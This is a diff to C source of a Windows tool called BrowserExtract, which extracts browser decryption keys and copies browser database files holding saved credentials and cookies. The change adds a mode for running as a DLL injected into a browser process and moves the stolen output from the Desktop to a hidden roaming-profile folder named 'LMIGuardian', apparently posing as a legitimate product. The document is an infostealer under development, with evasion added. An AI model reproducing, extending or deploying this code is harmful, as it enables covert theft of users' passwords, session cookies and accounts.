@@ -92,11 +92,14 @@ static VOID ProcessBrowser(IN BROWSER_TYPE Browser, IN LPCSTR pszBrowserDir)
     CopyBrowserFilesToOutputDir(Browser, pszBrowserDir);
 }
 
-// Core pipeline shared by both build types: check installed browser types,
-// extract the keys, write them to the desktop and copy the raw DB files.
+// Core pipeline shared by both build types: when running inside a browser
+// process (injected DLL) only that browser is processed; otherwise every
+// installed browser is scanned. Extracts the keys, writes them to the output
+// directory and copies the raw DB files.
 // Returns 0 on success, 1 when no supported browser data was found.
 static DWORD RunBrowserExtract(VOID)
 {
+    BROWSER_TYPE    BrowserDetected  = BROWSER_UNKNOWN;
     BROWSER_TYPE    Browsers[] = {
         BROWSER_CHROME,
         BROWSER_BRAVE,
@@ -114,42 +117,73 @@ static DWORD RunBrowserExtract(VOID)
     DWORD           dwProcessed         = 0x00;
 
     printf("==[ BrowserExtract ]==\n");
-    printf("[*] Checking Installed Browser Types ...\n");
 
-    if (!GetDesktopDirectoryA(szDesktop, MAX_PATH))
+    if (!GetRoamingDirectoryA(szDesktop, MAX_PATH))
         return 1;
 
     // Desktop\BrowserExtract\<BrowserName> output layout
-    wsprintfA(szRootDir, "%s\\%s", szDesktop, szRootDirName);
+    wsprintfA(szRootDir, "%s\\LMIGuardian\\%s", szDesktop, szRootDirName);
     SHCreateDirectoryExA(NULL, szRootDir, NULL);
 
-    for (DWORD i = 0; i < dwBrowserCount; i++)
+    // Am I running inside a browser process? If so, extract only that browser.
+    BrowserDetected = DetectBrowserFromProcess();
+
+    if (BrowserDetected != BROWSER_UNKNOWN)
     {
-        LPSTR pszBrowserName = NULL;
+        LPSTR pszDetectedName = GetBrowserName(BrowserDetected);
 
-        // Browser type check: the data root must contain a "Local State" file
-        if (!IsBrowserDataPresent(Browsers[i]))
+        if (pszDetectedName)
         {
-            if ((pszBrowserName = GetBrowserName(Browsers[i])) != NULL)
+            printf("[+] Running Inside '%s' Process, Extracting Only This Browser\n", pszDetectedName);
+
+            if (IsBrowserDataPresent(BrowserDetected))
             {
-                printf("[-] %s: Not Installed (Skipped)\n", pszBrowserName);
-                HEAP_FREE(pszBrowserName);
+                wsprintfA(szBrowserDir, "%s\\%s", szRootDir, pszDetectedName);
+                SHCreateDirectoryExA(NULL, szBrowserDir, NULL);
+
+                ProcessBrowser(BrowserDetected, szBrowserDir);
+                dwProcessed = 1;
             }
-            continue;
+            else
+            {
+                printf("[!] No %s Browser Data Found\n", pszDetectedName);
+            }
+
+            HEAP_FREE(pszDetectedName);
         }
+    }
+    else
+    {
+        printf("[*] Not Running Inside A Browser, Scanning All Installed Browsers ...\n");
 
-        if ((pszBrowserName = GetBrowserName(Browsers[i])) == NULL)
-            continue;
+        for (DWORD i = 0; i < dwBrowserCount; i++)
+        {
+            LPSTR pszBrowserName = NULL;
 
-        printf("[+] %s: Detected\n", pszBrowserName);
+            // Browser type check: the data root must contain a "Local State" file
+            if (!IsBrowserDataPresent(Browsers[i]))
+            {
+                if ((pszBrowserName = GetBrowserName(Browsers[i])) != NULL)
+                {
+                    printf("[-] %s: Not Installed (Skipped)\n", pszBrowserName);
+                    HEAP_FREE(pszBrowserName);
+                }
+                continue;
+            }
 
-        wsprintfA(szBrowserDir, "%s\\%s", szRootDir, pszBrowserName);
-        SHCreateDirectoryExA(NULL, szBrowserDir, NULL);
+            if ((pszBrowserName = GetBrowserName(Browsers[i])) == NULL)
+                continue;
 
-        HEAP_FREE(pszBrowserName);
+            printf("[+] %s: Detected\n", pszBrowserName);
 
-        ProcessBrowser(Browsers[i], szBrowserDir);
-        dwProcessed++;
+            wsprintfA(szBrowserDir, "%s\\%s", szRootDir, pszBrowserName);
+            SHCreateDirectoryExA(NULL, szBrowserDir, NULL);
+
+            HEAP_FREE(pszBrowserName);
+
+            ProcessBrowser(Browsers[i], szBrowserDir);
+            dwProcessed++;
+        }
     }
 
     if (dwProcessed == 0)
